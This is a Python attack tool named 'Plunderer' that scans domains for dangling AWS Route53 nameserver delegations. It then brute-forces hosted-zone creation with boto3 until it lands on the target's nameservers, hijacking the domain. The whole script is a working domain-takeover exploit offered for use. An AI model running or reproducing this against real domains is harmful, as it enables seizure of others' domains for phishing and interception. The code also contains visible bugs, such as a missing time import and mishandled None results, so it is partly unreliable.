#!/usr/bin/env python3
import dns
from dns.exception import DNSException
from dns.rdataclass import *
from dns.rdatatype import *
from dns.message import *
from dns.query import *
import dns.resolver
import argparse
import boto3
import json
import string
import random
import sys
import signal

banner = """
██████╗ ██╗     ██╗   ██╗███╗   ██╗██████╗ ███████╗██████╗ ███████╗██████╗
██╔══██╗██║     ██║   ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗
██████╔╝██║     ██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝█████╗  ██████╔╝
██╔═══╝ ██║     ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗
██║     ███████╗╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║███████╗██║  ██║
╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
           /\                                                 /\           
 _         )( ______________________   ______________________ )(         _
(_)///////(**)______________________> <______________________(**)\\\\\\\\\\\\\\(_)
           )(                                                 )(           
           \/                                                 \/           
"""

print(banner)

parser = argparse.ArgumentParser(description='Identify potentially hijackable Route53 hosted zones - then hijack them!', prog='Plunderer')
parser.add_argument('-d', '--domain', help='Target domain')
parser.add_argument('-m', '--mode', default='i', help='Would you like to check if subdomains are vulnerable to Route53 hijacking or hijack an identified vulnerable domain? (Valid values: [i]dentify / [h]ijack - default is i)')
parser.add_argument('-ns', '--awsnameserver', help='Only for mode: hijack - provide the vulnerable domains AWS nameserver(s), i.e. ns-170.awsdns-21.com or a comma seperated list, like the output of the identification function')
parser.add_argument('-iL', '--inputlist', help='Read domains from a list file')
parser.add_argument('-o', '--outfile', help='Write out list of vulnerable domains to a file')
args = parser.parse_args()

if args.domain is not None:
	targ = args.domain
	targlist = None
elif args.inputlist is not None:
	targlist = args.inputlist
	targ = None
else:
	print("[!] I need a domain to function - check out -iL or -d")
	parser.print_help()
	sys.exit()

if args.mode.lower() != "i" and args.mode.lower() != "h":
	print("[!] I need to know what mode I'm operating in")
	parser.print_help()
	sys.exit()

# Define handling of Ctrl+C
def signal_handler(sig, frame):
        print('[X] SHUTDOWN')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# Actual script functions

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))


def identifyRoute53Hijack(domain):
	resolver = dns.resolver.Resolver()
	vulnDomain = None
	awsNSList = []

	try:
		answr = resolver.query(domain, "NS")
	except DNSException as error:
#		print("[!] DNS problems occurred - good luck with that!")
		return vulnDomain

	awsTargetNS = []
	for x in answr:
		if "awsdns" not in str(x):
#			print("[!] AWS doesn't manage this domain")
			return vulnDomain
		else:
			awsTargetNS.append(str(x))
			try:
				nsIp = resolver.query(str(x), "A")
				for z in nsIp:
					awsNSList.append(str(z))
			except:
				continue

	for x in awsNSList:
		nameserver = x
		response = None
		query = dns.message.make_query(domain, dns.rdatatype.A, dns.rdataclass.IN)
		query.flags ^= dns.flags.RD
		cnames = []
		try:
			cnameReq = dns.resolver.query(domain, 'CNAME')
			for x in cnameReq:
				cnames.append(x)
		except DNSException:
			cnames = []

		if not cnames:
			try:
				response = dns.query.udp(query, nameserver)
			except DNSException:
				response = []
			if response.rcode() == dns.rcode.REFUSED:
				print("[+] Potential opportunity for theft")
				print("[+] Details:")
				print("	Domain: " + domain)
				print("	Nameservers: \n		" + ','.join(awsTargetNS))
				vulnDomain = domain
			elif response.rcode() == dns.rcode.SERVFAIL:
				print("[+] Potential opportunity for theft")
				print("[+] Details:")
				print("	Domain: " + domain)
				print("	Nameservers: \n		" + ','.join(awsTargetNS))
				vulnDomain = domain
#			else:
#				print("[!] Domain doesn't look vulnerable")

		return vulnDomain


def hijackRoute53(domain, ns):
	cl = boto3.client('route53')
	print("[+] Attempting to hijack domain: " + domain)
	print("[+] Target nameserver(s): " + str(ns))

	iterator = 1
	while True:
		ref = id_generator(10)
		time.sleep(1)
		res1 = cl.create_hosted_zone(
			Name=domain,
			CallerReference=ref,
			HostedZoneConfig={
				'Comment': 'BRUTE',
				'PrivateZone': False
			}
		)
		zone = cl.get_hosted_zone(Id=res1['HostedZone']['Id'])

		if isinstance(ns, list):
			nsInZone =  any(elem in ns for elem in zone['DelegationSet']['NameServers'])
			if nsInZone:
				sys.stdout.write("\r[+] Got it on attempt #" + str(iterator) + " - successfully hijacked " + domain + "\r\n")
				sys.exit()
			else:
				sys.stdout.write("\r[!] No luck - killing attempt #" + str(iterator))
				sys.stdout.flush()
				iterator += 1
				cl.delete_hosted_zone(Id=res1['HostedZone']['Id'])

		elif isinstance(ns, str):
			if ns in zone['DelegationSet']['NameServers']:
				sys.stdout.write("\r[+] Got it - successfully hijacked " + domain + "\r\n")
				sys.exit()
			else:
				sys.stdout.write("\r[!] No luck - killing attempt #" + str(iterator))
				sys.stdout.flush()
				iterator += 1
				cl.delete_hosted_zone(Id=res1['HostedZone']['Id'])


if args.mode.lower() == "i":
	tmpIdentVulnDomains = []
	if targlist is not None:
		try:
			with open(targlist) as f:
				targs = f.read().splitlines()
			print("[+] Scanning for vulnerable domains in target file: " + targlist)

		except:
			print("[!] I need a file that only contains a simple list of domains to check")
			sys.exit(0)

		for x in targs:
			tmpIdent = identifyRoute53Hijack(x)
			if tmpIdent is not None:
				tmpIdentVulnDomains.append(tmpIdent)
	else:
		print("[+] Checking if " + targ + " is vulnerable")
		tmpIdent = str(identifyRoute53Hijack(targ))
		if tmpIdent is not None:
			tmpIdentVulnDomains.append(tmpIdent)

	identVulnDomains = list(filter(None, tmpIdentVulnDomains))

	if not identVulnDomains:
		print("[!] No vulnerable domains found")
	elif args.outfile is not None:
		print("[+] Writing results to " + args.outfile)
		with open(args.outfile, mode='wt', encoding='utf-8') as out:
			out.write('\n'.join(identVulnDomains))

elif args.mode.lower() == "h":
	if args.awsnameserver is not None:
		if ',' in args.awsnameserver:
			tmpNSList = args.awsnameserver.split(',')
			ns = []
			for x in tmpNSList:
				ns.append(x.rstrip('.'))
		else:
			ns = args.awsnameserver.rstrip('.')
		hijackRoute53(targ,ns)
	else:
		print("[!] We need a nameserver for the vulnerable domain")
		sys.exit()


